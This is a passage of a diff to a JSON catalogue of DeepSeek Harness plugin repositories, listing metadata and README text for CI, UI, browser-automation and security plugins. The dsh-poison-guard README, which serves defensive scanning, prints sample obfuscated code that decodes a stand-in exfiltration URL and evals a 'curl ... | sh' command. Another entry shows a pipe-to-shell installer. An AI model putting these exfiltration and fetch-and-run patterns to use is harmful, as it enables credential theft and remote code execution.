+      "readme_text": "# dsh-error-handling\n\n错误处理模式：错误分层（预期/意外）、类型化错误与统一格式、优雅降级、\n可观测性（日志/指标/告警）、恢复策略（重试/补偿/人工介入）。\n\n受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）\n的 developer-essentials/error-handling-patterns 技能启发，改编为 DSH\n中文原创精简版（与 dsh-observability / dsh-tdd 互补）。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-error-handling\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-error-handling\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"错误处理怎么设计\"，`error-handling` 技能输出\n错误分层 + 类型化格式 + 优雅降级 + 可观测方案。\n\n## 结构\n\n```\ndsh-error-handling/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/error-handling/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 wshobson/agents（MIT）。\n"
+    },
     {
       "full_name": "satan9394/dsh-prompt-audit",
       "html_url": "https://github.com/satan9394/dsh-prompt-audit",
@@ -9419,623 +9815,6 @@
         "agent"
       ],
       "readme_text": "[简体中文](README.zh.md)\n\n# ci-runner\n\nTrigger your CI and get it fixed — a dsh plugin bundle that runs GitHub\nActions workflows and local test pipelines, streams their logs back, tracks\ntheir status, and when something fails hands the tail of the log to DeepSeek\nfor a Markdown root-cause report with fix steps.\n\n- **Two sources, one interface**: GitHub Actions via `workflow_dispatch`\n  (+ check-run APIs) and local command pipelines (`npm test`, `pytest`, …)\n  through the platform shell.\n- **Bounded log reading**: GitHub job logs streamed back per job and\n  tail-truncated; local output captured with a per-stream cap so a runaway\n  process can't blow up the agent context.\n- **DeepSeek diagnosis**: on failure, the tail log plus a heuristic error\n  classification is sent to the harness `ctx.llm` (or any configured\n  OpenAI-compatible endpoint) to produce a report covering failure stage,\n  error classification, most likely root cause, suggested fix steps and\n  related files.\n- **Status tracking**: poll runs to completion (`queued` / `in_progress` /\n  `completed`) with configurable interval and a hard timeout.\n- **Credentials by environment only**: the GitHub token is read from an\n  environment variable at call time, never logged and never persisted; every\n  returned log and report is masked against known secrets.\n- **Zero runtime dependencies**: `fetch` + `node:child_process`, plain\n  Node.js ESM, ships with five tools (`ci_trigger`, `ci_status`, `ci_logs`,\n  `ci_watch`, `ci_diagnose`) and a matching CLI.\n\n## How it works\n\n```\nyour repo / your machine\n   │   workflow_dispatch + check-run APIs      shell (npm test, pytest, …)\n   ▼                                          ▼\nGitHubApi (fetch)                    LocalRunner (child_process)\n   │                                          │\n   └──────────────► CiService ◄────────────────┘\n        │    trigger · status · logs · watch · diagnose\n        ├─► dsh adapter: five ci_* tools on ctx.tools (ctx.llm for analysis)\n        ├─► CLI:        ci-runner trigger|status|logs|watch|diagnose\n        └─► report:     Markdown with the five canonical sections\n```\n\nAll state (stored local runs, config, secret-masking) lives in one\n`CiService` instance, so tools and CLI behave identically. The dsh adapter\nand the CLI are two thin entry points over it.\n\n## Requirements\n\n- Node.js >= 18.17 (global `fetch`)\n- For the dsh integration: a working DeepSeek Harness install providing the\n  `tools` service (and, for model-powered diagnosis, the `llm` service).\n- A GitHub token in the environment (`GITHUB_TOKEN` by default) with\n  `actions:write` scope for dispatch and `actions:read` for status/logs.\n\n## Installation into dsh\n\n### As a dsh bundle (recommended)\n\nA bundle is an npm package that contributes a configuration layer. From the\nprofile you want to use:\n\n```sh\ndsh plugin --profile demo add ./path/to/ci-runner\n```\n\nThis links the checkout and appends `dsh-ci-runner` to the profile's bundle\nlist because `package.json` declares `dsh.bundle`. Verify and boot:\n\n```sh\ndsh --profile demo --dump-config   # shows the \"# == dsh-ci-runner\" layer\ndsh --profile demo\n```\n\nThe contributed patch layer (`cordis.patch.yml`) inserts one plugin row\nmounting the adapter entry (a package subpath resolved through the package's\n`exports` map):\n\n```yaml\n- insert:\n    - id: ci-runner\n      name: dsh-ci-runner/adapter\n```\n\n### As a patch overlay (no packaging)\n\nPoint the plugin row directly at the adapter source. Create an overlay file\n`ci-runner-patch.yml`:\n\n```yaml\n- insert:\n    - id: ci-runner\n      name: '<abs-path>/src/adapter.js'\n```\n\nand pass it to the harness:\n\n```sh\ndsh --patch ./ci-runner-patch.yml\n```\n\n### Applying plugin config\n\nWhen installed as a bundle, plugin configuration is set through the profile\nconfig (the layer contributed by the bundle) — every field is optional and\ndefaulted:\n\n```yaml\n# profile/config.yml\nci-runner:\n  github:\n    defaultRepo: acme/app\n    defaultBranch: main\n  diagnosis:\n    llm:\n      baseUrl: https://api.deepseek.com/v1\n      apiKey: sk-...\n      model: deepseek-chat\n```\n\nWithout `diagnosis.llm`, analysis routes through the harness `ctx.llm`\nservice (preferred — matches the harness's configured provider). If neither\nexists, diagnosis still produces a deterministic report (stage +\nclassification + log tail) with a note about the missing model.\n\n## Configuration\n\n| Field | Default | Meaning |\n| --- | --- | --- |\n| `github.tokenEnv` | `GITHUB_TOKEN` | Env var holding the GitHub token (read at call time, never logged) |\n| `github.defaultRepo` | `''` | Default `owner/repo` for GitHub calls |\n| `github.defaultBranch` | `main` | Ref used when a trigger doesn't specify one |\n| `github.apiBase` | `https://api.github.com` | REST base (GitHub Enterprise override) |\n| `github.pollIntervalMs` | `5000` | Poll interval for status tracking |\n| `github.pollTimeoutMs` | `600000` | Hard cap for waiting on a run |\n| `github.dispatchWindowMs` | `20000` | How long a dispatch may take to surface a run id |\n| `github.requestTimeoutMs` | `30000` | Per-request HTTP timeout |\n| `github.readLogChars` | `30000` | Default tail cap for `ci_logs` |\n| `local.cwd` | `.` | Working directory for command runs |\n| `local.timeoutMs` | `120000` | Hard timeout per command |\n| `local.maxOutputChars` | `40000` | Per-stream output cap |\n| `local.templates` | `[{name: 'npm test', command: 'npm test'}, {name: 'pytest', command: 'pytest'}]` | Named command templates |\n| `diagnosis.llm` | `null` | OpenAI-compatible endpoint override `{baseUrl, apiKey, model}` |\n| `diagnosis.provider` | `''` | `ctx.llm` provider route (`''` = auto) |\n| `diagnosis.model` | `''` | `ctx.llm` model (`''` = auto) |\n| `diagnosis.maxTailChars` | `12000` | Chars of the log tail sent to the model |\n| `diagnosis.timeoutMs` | `120000` | Hard budget for the analysis call |\n| `diagnosis.temperature` | `0.2` | Sampling temperature |\n| `diagnosis.providerLabel` | `OpenAI-compatible` | Label recorded in reports when the endpoint override is used |\n\nTemplates let the model and the CLI reference pipelines by name\n(`ci_trigger {source: local, command: 'npm test'}`). Any value that doesn't\nmatch a template name is treated as a raw shell command line.\n\n## Tools\n\n| Tool | Purpose |\n| --- | --- |\n| `ci_trigger` | Dispatch a GitHub `workflow_dispatch` (returns the run id) or run a local pipeline to completion |\n| `ci_status` | Single poll: status, conclusion, failed stage, jobs and steps |\n| `ci_logs` | Read logs, masked and tail-truncated; `job` selects one job |\n| `ci_watch` | (Optionally trigger and) wait until a run finishes; failed runs include the log tail |\n| `ci_diagnose` | End-to-end: run/wait, then send the failure tail to the analysis provider and return the Markdown report |\n\n### Report structure\n\n`ci_diagnose` (and the CLI `diagnose` command) always emit the canonical\nsections:\n\n```\n# CI Failure Report\n## Failure Stage          ← first failing job/step (or \"Unknown\")\n## Error Classification   ← heuristic rule-based pre-analysis\n## Most Likely Root Cause ← model analysis (or a note when no model is available)\n## Suggested Fix Steps    ← model analysis\n## Related Files          ← model analysis (or \"None identifiable from the log\")\n## Timeline               ← start/end/duration when known\n## Failure Log Tail       ← masked, tail-truncated\n```\n\nWhen a model is available, its free-form Markdown is parsed back into these\nsections before rendering, so the structure is stable even as the model's\nwording varies.\n\n## CLI\n\n```\nci-runner trigger  [--source github|local] [--repo owner/repo] [--workflow F]\n                   [--ref R] [--inputs k=v ...] [--command CMD] [--template T]\n                   [--cwd DIR]\nci-runner status   [--source s] --run ID [--repo r]\nci-runner logs     [--source s] --run ID [--job J] [--tail N] [--repo r]\nci-runner watch    [--source s] [--run ID | trigger flags] [--timeout-ms N]\n                   [--interval-ms N] [--no-logs] [--json]\nci-runner diagnose [--source s] [--run ID | trigger flags] [--save PATH]\n                   [--llm-base-url URL] [--llm-model M] [--llm-api-key K]\n```\n\nGlobal: `--config PATH` (JSON config file), `--json`, `--help`, `--versio"
-    },
-    {
-      "full_name": "Carrick-K7/dsh-plugin-source",
-      "html_url": "https://github.com/Carrick-K7/dsh-plugin-source",
-      "description": "DeepSeek Harness plugin: group the Settings plugin list by origin (official/community), show version, upstream repo link and local-dev marker. Read-only, zero network.",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-08-29T12:44:20Z",
-      "topics": [
-        "cordis",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "plugin"
-      ],
-      "categories": [
-        "工具/开发"
-      ],
-      "tags": [
-        "cordis",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "plugin"
-      ],
-      "readme_text": "# dsh-plugin-source\n\n增强 DeepSeek Harness 官方「设置 → 插件 → 插件列表」tab：**按来源分组**，一眼区分**官方**与**社区插件**，并显示版本、上游仓库（org/repo 一键跳转）与本地开发标记。\n\n纯只读、零网络、零写盘：所有数据来自本地文件（loader 清单 + `node_modules/<pkg>/package.json` + profile `package.json`）。\n\n![设置 → 插件 → 插件列表：社区插件组排在官方组前面，展开卡片显示版本、上游仓库与本地开发标记](docs/plugin-list.png)\n\n## 功能\n\n- **来源分组**（组头计数，可折叠；**社区插件组排在官方插件组前面**）：\n  - `@deepseek-ai/` 前缀 → **官方**（官方 monorepo 作用域）\n  - `cordis:` 前缀 → **官方**（loader 内部基建，并入官方组）\n  - 其余 → **社区插件**\n- **来源徽标**：每张卡片带来源标签。\n- **版本号**：卡片显示已装版本（官方页不显示）。\n- **上游仓库**：读本地 `repository`/`homepage` 字段，显示 org/repo 并一键跳转 GitHub；未声明的显示「未声明仓库」。\n- **本地开发标记**：profile `dependencies` 里 `file:`/`link:` 依赖 → 「本地开发」（自己写的），其余 → 已安装。\n- 官方功能全部保留：搜索、展开详情（entryId / 配置状态 / Cordis 状态）、状态点、重试。\n\n## 实现方式\n\n影子覆盖（shadow）：注册 `settings.plugins.tab` 插槽 **id=`all`、priority=-1**（官方默认 0）。\nDSH slots 的 list 语义是「同 id 不同 priority 共存、最低者渲染」，因此 tab 名字与位置不变，\n官方组件被我们的增强组件遮蔽。\n\n数据通道：\n\n- 插件清单：官方 `ctx.remote.pluginInventory.list()`（client 直调）；\n- 来源元数据：自建只读 remote `pluginSource/describe(moduleNames)`（host 读本地文件）。\n\n## 构建与安装\n\n```sh\npnpm install\nnode build.mjs          # 产出 lib/index.js (host) + lib/client.js (web)\n# 完整构建（含类型声明）：npm run build\n```\n\n安装（bundle 类型）：\n\n```sh\n# 从 npm 安装（发布后）\ndsh plugin --profile web add dsh-plugin-source\n# 从 GitHub 安装\ndsh plugin --profile web add github:Carrick-K7/dsh-plugin-source\n# 本地开发：dsh plugin --profile web add link:/path/to/dsh-plugin-source\n```\n\n装完重启 `dsh web`，打开 设置 → 插件 → 插件列表 即可看到分组。\n\n## 目录\n\n```\nsrc/\n  classify.ts      来源判定 + 仓库解析（纯函数）\n  contract.ts      wire 契约（zod schema，host/client 共用）\n  typert.ts        host manifest\n  host.ts          host 插件：describe remote（只读本地文件）\n  client/index.tsx web 插件：shadow 官方 tab + 分组组件\n  client/remote.ts client remote 贡献\n  client/styles.ts 组件样式（--dsw-alias-* 变量）\n```\n\n## 许可\n\nMIT\n"
-    },
-    {
-      "full_name": "Jiong-w-ang/dsh-preview-panel",
-      "html_url": "https://github.com/Jiong-w-ang/dsh-preview-panel",
-      "description": "A multi-tab preview panel plugin for DeepSeek Harness",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-16T12:45:08Z",
-      "topics": [
-        "dsh-plugin",
-        "dsh-plugin-desktop",
-        "dsh-plugin-market",
-        "dsh-plugins"
-      ],
-      "categories": [
-        "工具/开发"
-      ],
-      "tags": [
-        "dsh-plugin",
-        "dsh-plugin-desktop",
-        "dsh-plugin-market",
-        "dsh-plugins",
-        "agent"
-      ],
-      "readme_text": "# @deepseek-ai/dsh-client-ui-preview\n\nEnglish | [中文](README.zh.md)\n\nPreview panel for agent-produced artifacts. The browser half registers one entry into the conversation view ring (`conversation.view`, id `preview`): it accumulates the files a turn produced (from the mutation tools' render-intent `locations`, filtered to a preview whitelist) and renders the selected file in a sandboxed surface — HTML in a `sandbox`-scoped iframe, images and SVG inline, and JSON/Markdown as read-only code. The package is a pure consumer: composing it out of `cordis.yml` removes the tab at zero cost.\n\n## Usage\n\nCompose the package into the client and the `preview` tab appears beside the chat view:\n\n```yaml\nplugins:\n  '@deepseek-ai/dsh-client-ui-preview': true\n```\n\nFor each turn the panel accumulates files whose render-intent `locations` end in a whitelisted extension (`.html`, `.htm`, `.svg`, `.png`, `.jpg`, `.jpeg`, `.json`, `.md`), deduplicated by path and newest-turn-first. Selecting a file reads it through the host's `session.readFile` RPC and renders it by MIME:\n\n- `text/html` — a `sandbox=\"allow-scripts\"` iframe; the page's scripts run against an opaque origin and cannot reach the shell\n- `image/png` / `image/jpeg` / `image/svg+xml` — an inline `<img>` over a base64 data URL\n- `application/json` / `text/markdown` / anything else — a read-only code block (Markdown renders as formatted text)\n\nThe host refuses reads outside the session cwd, outside the extension whitelist, or above 20 MiB (5 MiB returns a truncated preview with a warning).\n\n## Model Experience\n\nNone, as the preview panel renders session data in the browser; nothing here reaches a model request.\n\n#### KV Cache effect\n\nNone; this package neither assembles nor sends a provider request.\n\n## Known Limitations and Deferred Work\n\n- **File content read is a new host→client RPC** — the panel reads produced-file bytes through a `session.readFile` remote limited to the session cwd, a preview extension whitelist, and a size ceiling; rendering falls back to a not-previewable notice when the host refuses.\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-poison-guard",
-      "html_url": "https://github.com/zoahdev/dsh-poison-guard",
-      "description": "Pre-install supply-chain poison scanner for DeepSeek Harness plugins: AST (JS-X-Ray) + deobfuscation + regex. Catches obfuscated exfiltration, eval, hidden shell commands.",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-08-17T14:18:48Z",
-      "topics": [
-        "ast",
-        "deepseek",
-        "deepseek-harness",
-        "dsh-plugin",
-        "js-x-ray",
-        "malware",
-        "obfuscation",
-        "sast",
-        "security",
-        "supply-chain"
-      ],
-      "categories": [
-        "工具/开发"
-      ],
-      "tags": [
-        "ast",
-        "deepseek",
-        "deepseek-harness",
-        "dsh-plugin",
-        "js-x-ray",
-        "malware",
-        "obfuscation",
-        "sast"
-      ],
-      "readme_text": "# dsh-poison-guard\n\n[![CI](https://github.com/zoahdev/dsh-poison-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-poison-guard/actions/workflows/ci.yml)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![Release](https://img.shields.io/badge/release-v0.2.0-58a6ff.svg)](https://github.com/zoahdev/dsh-poison-guard/releases)\n[![npm](https://img.shields.io/npm/v/dsh-poison-guard)](https://www.npmjs.com/package/dsh-poison-guard)\n\n**Live demo:** https://zoahdev.github.io/dsh-poison-guard/\n\nPre-install supply-chain **poison scanner** for DeepSeek Harness plugins. It is\nnot a toy regex grep: it runs three layers on every plugin before you `dsh plugin add` it —\n\n1. **AST analysis** via [NodeSecure JS-X-Ray](https://github.com/NodeSecure/js-x-ray)\n   (the SAST used by NodeSecure CLI): variable tracing, dynamic-import resolution,\n   obfuscator detection, `eval`/`Function`/`vm` sinks, `data-exfiltration`,\n   `serialize-environment`, unsafe shell commands, and more.\n2. **Deobfuscation decoder** that unpacks `atob()`, `Buffer.from(..., \"base64\"/\"hex\")`,\n   `String.fromCharCode(...)`, and `\\xNN` / `\\uNNNN` escapes, then re-scans the decoded\n   strings for hidden credentials, URLs, and shell commands.\n3. **Regex heuristics** as a fallback for obvious literals, non-code files, and\n   install-time scripts (`prepare` / `postinstall` / `install` / `preinstall`).\n\n## The honest threat model\n\nNo static tool can catch **all** poisoning. Detecting arbitrary malicious behavior in\narbitrary code is undecidable (Rice's theorem); a determined attacker can always craft\nan obfuscation this scanner cannot see through. What this tool does is make the cheap,\nhigh-volume attacks — hidden exfiltration URLs, obfuscated `require(\"child_process\")`,\n`eval` of base64 blobs, `process.env` harvests, `.ssh` reads, install-time `curl ... | sh` —\nvisible to someone who would never find them by reading source. It is **defense-in-depth,\nnot a security boundary**.\n\nThe real boundary is the harness sandbox: keep untrusted plugins in `workspace-write`,\nnever `danger-full-access`. The last layer is provenance: prefer verified, maintained,\nclearly-authored plugins.\n\n## What it detects\n\n| Severity | Examples |\n| --- | --- |\n| HIGH | `ast/data-exfiltration`, `ast/unsafe-import` (obfuscated require), `ast/unsafe-stmt` (eval/Function/vm), `ast/unsafe-command`, `deobfuscated-secret`, `deobfuscated-key`, `deobfuscated-command`, `exfil-combo`, credential references, private-key paths |\n| MEDIUM | `ast/serialize-environment`, `ast/shady-link`, `ast/sql-injection`, `ast/monkey-patch`, `ast/prototype-pollution`, `deobfuscated-url`, network egress, `child_process`, install-time scripts |\n| LOW | `ast/encoded-literal`, `ast/short-identifiers`, `ast/unsafe-regex`, `ast/crypto.weak-algorithm`, `env-read`, base64 obfuscation |\n\nRules are prefixed by layer: `ast/*` (JS-X-Ray), `deobfuscated-*` (decoder),\n`install-script*` (manifest), and unprefixed (regex fallback).\n\n## Usage\n\n```sh\n# human-readable verdict\ndsh-poison-guard scan ./some-plugin\n\n# machine-readable (for CI gates)\ndsh-poison-guard scan ./some-plugin --json\n\n# install into a profile (then the agent gains a `plugin_scan` tool)\ndsh plugin --profile web add dsh-poison-guard\n\n# or as a global CLI\nnpm install -g dsh-poison-guard\n```\n\nExit code: `0` = CLEAN, `1` = at least one finding (wire it as a CI gate).\n\n### Example\n\n```text\n🔴 MALICIOUS  8 high / 5 medium / 4 low finding(s)\nengine: AST(js-x-ray) + deobfuscation + regex | 1 source file(s), 3 AST warning(s), 3 decoded fragment(s)\n\n[HIGH] ast/unsafe-import  index.js:6\n       obfuscated or untraceable import (require/import of a computed value)\n[HIGH] deobfuscated-url  index.js:3\n       decoded obfuscated URL: https://evil.example/exfil\n[HIGH] exfil-combo  (whole plugin):0\n       reads credentials/secrets AND makes network requests - the classic exfiltration shape\n```\n\n### CI gate\n\n```yaml\n- run: pnpm install --frozen-lockfile\n- run: dsh-poison-guard scan ./my-plugin --json\n```\n\nThe scanner is synchronous and dependency-light at runtime (AST engine is pure\nJavaScript, no native modules).\n\n## Why AST + deobfuscation beats a regex scanner\n\nA regex scanner misses everything below because there is no literal string to match:\n\n```js\nconst lib = Buffer.from(\"6673\", \"hex\").toString()      // \"fs\"\nconst fs = require(lib)                                  // -> ast/unsafe-import\n\nconst target = atob(\"aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=\") // \"https://evil.example/exfil\"\nawait fetch(target)                                      // -> deobfuscated-url\n\nconst cmd = String.fromCharCode(99,117,114,108)          // \"curl\"\neval(\"execSync('\" + cmd + \" evil.sh | sh')\")             // -> deobfuscated-command + ast/unsafe-stmt\n```\n\n## Limitations\n\n- Static only — does not execute the plugin or observe runtime behavior.\n- Obfuscation can be made undecidable; stronger obfuscators (e.g. `javascript-obfuscator`\n  with string-array + control-flow flattening) may still hide the payload.\n- The AST layer is tuned to `aggressive` sensitivity for maximum visibility; a benign\n  plugin that does real `eval`/`child_process` work will also be flagged.\n- No sandbox policy is enforced here; pair it with the harness sandbox.\n\n## Development\n\n```sh\npnpm install --frozen-lockfile\npnpm typecheck\npnpm build\npnpm test\n```\n\nMIT license. Community template — not an official DeepSeek product.\n\n---\n\n# dsh-poison-guard（中文）\n\nDeepSeek Harness 插件的**安装前投毒扫描器**。不是正则 grep，而是在 `dsh plugin add` 之前跑三层检测：\n\n1. **AST 分析**（[NodeSecure JS-X-Ray](https://github.com/NodeSecure/js-x-ray)，NodeSecure CLI 同款 SAST）：变量追踪、动态 import 解析、混淆器识别、`eval`/`Function`/`vm`、数据外发、`process.env` 序列化、危险 shell 命令等。\n2. **反混淆解码器**：解开 `atob()`、`Buffer.from(...,\"base64\"/\"hex\")`、`String.fromCharCode(...)`、`\\xNN`/`\\uNNNN` 转义，再对解出来的字符串二次扫描隐藏的密钥、URL、shell 命令。\n3. **正则兜底**：覆盖明显字面量、非代码文件、以及 `prepare`/`postinstall`/`install`/`preinstall` 安装脚本。\n\n## 老实说边界\n\n任何静态工具都无法拦住**所有**投毒（Rice 定理，不可判定）。它拦住的是大量低成本攻击：隐藏的外发 URL、混淆的 `require(\"child_process\")`、base64 `eval`、`process.env` 收割、读 `.ssh`、安装脚本 `curl ... | sh`。它是纵深防御，不是安全边界。真正的边界是 harness 沙箱：未验证插件永远别开 `danger-full-access`；最后一层是来源信誉。\n\n## 用法\n\n```sh\ndsh-poison-guard scan ./some-plugin\ndsh-poison-guard scan ./some-plugin --json   # 接 CI 门禁\ndsh plugin --profile web add github:zoahdev/dsh-poison-guard\n```\n\n退出码：`0` = CLEAN，`1` = 有发现。装进 dsh 后，agent 会多一个 `plugin_scan` 工具，可扫任意插件目录。\n\n## 为什么比纯正则强\n\n正则抓不到下面这些（因为没有可直接匹配的字面量）：\n\n```js\nconst lib = Buffer.from(\"6673\", \"hex\").toString()  // \"fs\"\nconst fs = require(lib)                            // -> ast/unsafe-import\nconst target = atob(\"aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=\")\nawait fetch(target)                                // -> deobfuscated-url\n```\n\nMIT 许可。社区模板，非 DeepSeek 官方产品。\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-browser-use",
-      "html_url": "https://github.com/zoahdev/dsh-browser-use",
-      "description": "Browser Use bridge for DeepSeek Harness: run real web tasks (open pages, click, type, fill forms, extract data) through the Browser Use Cloud API.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-17T08:40:41Z",
-      "topics": [
-        "agent",
-        "browser",
-        "browser-use",
-        "deepseek-harness",
-        "dsh-plugin",
-        "web-automation"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "agent",
-        "browser",
-        "browser-use",
-        "deepseek-harness",
-        "dsh-plugin",
-        "web-automation"
-      ],
-      "readme_text": "# dsh-browser-use\n\n> Browser Use bridge for DeepSeek Harness: let your `dsh` agent run real web tasks — open pages, click, type, fill forms, extract data — through the [Browser Use](https://github.com/browser-use/browser-use) Cloud API.\n\n[![CI](https://github.com/zoahdev/dsh-browser-use/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-browser-use/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n\nEnglish | [中文](#中文)\n\n## What it is\n\nA thin, honest bridge. It registers one model-facing tool, `browser_use_run`,\nforwards the task to Browser Use's cloud endpoint, and returns the raw run\nresult. It does **not** reimplement Browser Use and does **not** claim to be a\nfull integration.\n\n## Install\n\n```sh\ndsh plugin --profile web add dsh-browser-use\n```\n\nThen set your Browser Use API key (config `apiKey`, or the `BROWSER_USE_API_KEY`\nenv var).\n\n## Two modes: cloud vs. local\n\n| Mode | Needs | Tools you get |\n| --- | --- | --- |\n| **Cloud** (this plugin) | Browser Use API key | `browser_use_run` |\n| **Local** (free, no key) | Python + `browser-use` installed | `mcp__browser_use__browser_exec`, `mcp__browser_use__browser_screenshot` |\n\n### Local mode (no Browser Use API key)\n\nBrowser Use also runs locally as an MCP stdio server — no cloud subscription.\nDeepSeek Harness already ships `@deepseek-ai/dsh-mcp-client`, so you do **not**\nneed this plugin for the local path. Install Browser Use once\n(`pip install 'browser-use[cli]'`), then add this to your profile's\n`cordis.yml`:\n\n```yaml\n- insert:\n    - id: browser-use-local\n      name: '@deepseek-ai/dsh-mcp-client'\n      config:\n        serverName: browser_use\n        transport: stdio\n        command: browser-use\n        args: ['--cli-mcp']\n        cwd: !!js process.cwd()\n```\n\nThat registers `mcp__browser_use__browser_exec` and\n`mcp__browser_use__browser_screenshot`. A ready-to-copy file is in\n[`examples/local-mcp.cordis.yml`](examples/local-mcp.cordis.yml).\n\n## Tool\n\n| Parameter | Type | Description |\n| --- | --- | --- |\n| `task` | string | The task, e.g. \"Find the stars of the browser-use repo\". |\n| `model` | string | Optional provider-prefixed model id, e.g. `openai/gpt-5.5`. |\n\nReturns `{ result }` — the raw Browser Use run result.\n\n## Config\n\n| Key | Type | Default | Description |\n| --- | --- | --- | --- |\n| `apiKey` | string | *(env)* | Browser Use API key |\n| `baseUrl` | string | `https://api.browser-use.com` | Cloud API base URL |\n| `timeoutMs` | number | `300000` | Request timeout |\n| `model` | string | *(none)* | Default model |\n\n## Verified\n\n- `pnpm typecheck` · `pnpm build` · `pnpm test` (4 tests, mocked HTTP).\n- Tested with `@deepseek-ai/dsh-tools ^0.1.0-rc.6`.\n\n## Honest limits\n\n- This is a cloud-API bridge; it needs a Browser Use API key.\n- Local mode is provided by DeepSeek Harness's own `mcp-client`, not by this\n  package; this README documents both so you can pick the cheaper path.\n- It returns the raw response; it does not stream or poll for completion.\n- Community plugin, not an official Browser Use or DeepSeek product.\n\n---\n\n# 中文\n\n> 给 DeepSeek Harness 的 Browser Use 桥接：让 `dsh` agent 通过 Browser Use 云\n> API 执行真实网页任务（打开页面、点击、输入、填表、抽取数据）。\n\n注册一个 `browser_use_run` 工具：把任务转发给 Browser Use，返回原始运行结果。\n这是薄桥接，不重新实现 Browser Use，也不冒充官方。\n\n```sh\ndsh plugin --profile web add dsh-browser-use\n```\n\n需要配置 Browser Use API key（`apiKey` 配置项，或环境变量 `BROWSER_USE_API_KEY`）。\n\n## 两种模式：云端 vs. 本地\n\n| 模式 | 需要 | 得到的工具 |\n| --- | --- | --- |\n| **云端**（本插件） | Browser Use API key | `browser_use_run` |\n| **本地**（免费，无需 key） | Python + `browser-use` 已安装 | `mcp__browser_use__browser_exec`、`mcp__browser_use__browser_screenshot` |\n\n### 本地模式（无需 Browser Use API key）\n\nBrowser Use 也能以本地 MCP stdio 服务运行，无需云订阅。DeepSeek Harness 已经内置\n`@deepseek-ai/dsh-mcp-client`，所以本地路径**不需要本插件**。先安装一次\nBrowser Use（`pip install 'browser-use[cli]'`），然后把你 profile 的\n`cordis.yml` 加上：\n\n```yaml\n- insert:\n    - id: browser-use-local\n      name: '@deepseek-ai/dsh-mcp-client'\n      config:\n        serverName: browser_use\n        transport: stdio\n        command: browser-use\n        args: ['--cli-mcp']\n        cwd: !!js process.cwd()\n```\n\n这会注册 `mcp__browser_use__browser_exec` 和\n`mcp__browser_use__browser_screenshot`。现成可复制的文件在\n[`examples/local-mcp.cordis.yml`](examples/local-mcp.cordis.yml)。\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-kirocrew",
-      "html_url": "https://github.com/zoahdev/dsh-kirocrew",
-      "description": "KiroCrew bridge for DeepSeek Harness: delegate turns to a persistent, self-evolving workspace over ACP (JSON-RPC 2.0).",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-17T08:36:24Z",
-      "topics": [
-        "acp",
-        "agent",
-        "deepseek-harness",
-        "dsh-plugin",
-        "kirocrew"
-      ],
-      "categories": [
-        "内容/媒体"
-      ],
-      "tags": [
-        "acp",
-        "agent",
-        "deepseek-harness",
-        "dsh-plugin",
-        "kirocrew",
-        "ocr"
-      ],
-      "readme_text": "# dsh-kirocrew\n\n[![CI](https://github.com/zoahdev/dsh-kirocrew/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-kirocrew/actions/workflows/ci.yml)\n[![npm](https://img.shields.io/npm/v/dsh-kirocrew)](https://www.npmjs.com/package/dsh-kirocrew)\n\nBridge **KiroCrew** into **DeepSeek Harness**: let your `dsh` agent delegate a turn\nto a persistent, self-evolving development workspace over\n[ACP](https://agentclientprotocol.com) (JSON-RPC 2.0 over stdio).\n\n> **KiroCrew** is an open-source workspace that runs on your hardware, remembers\n> across sessions, and keeps working unattended. This plugin exposes that\n> workspace to a DeepSeek Harness agent as a single `kiro_send` tool.\n\n## What it does\n\n- Registers one model-facing tool: **`kiro_send`**.\n- `kiro_send` spawns `kiro-cli acp`, performs the ACP handshake\n  (`initialize → session/new → session/prompt`), forwards your prompt, collects\n  the agent's text chunks, and returns the final text.\n- Auto-approves ACP `session/request_permission` by default (`allow_once`);\n  set `autoApproveTools: false` to deny instead.\n\nThis is a **thin, honest bridge**: it forwards the prompt and returns the text.\nIt does not reimplement KiroCrew.\n\n## Requirements\n\n- Node.js 18+\n- `kiro-cli` installed and signed in (KiroCrew's CLI). The ACP backend lives\n  behind `kiro-cli acp`.\n\nInstall KiroCrew from its official one-liner (macOS / Linux / Windows WSL):\n\n```bash\ncurl -fsSL https://download.crew.kiro.dev/cli.sh | sh\n```\n\nSee the [KiroCrew repo](https://github.com/kirodotdev/KiroCrew) for the desktop\napp, Docker, and Windows source-install paths.\n\n## Install\n\n```bash\ndsh plugin add dsh-kirocrew\n```\n\nor globally:\n\n```bash\nnpm install -g dsh-kirocrew\n```\n\n## Usage\n\n```text\nYou: kiro_send(\"Write a failing test and fix it\")\n```\n\nConfiguration (plugin config):\n\n```jsonc\n{\n  \"bin\": \"kiro-cli\",          // optional: path to kiro-cli\n  \"cwd\": \"/path/to/work\",     // optional: session working directory\n  \"mode\": \"coder\",            // optional: KiroCrew agent mode id\n  \"model\": \"anthropic/...\",   // optional: model id\n  \"timeoutMs\": 120000,        // optional: turn timeout\n  \"autoApproveTools\": true    // optional: auto-allow tool permissions\n}\n```\n\nPer-call overrides are also accepted by `kiro_send`: `cwd`, `mode`, `model`.\n\n## Troubleshooting\n\n**`failed to spawn 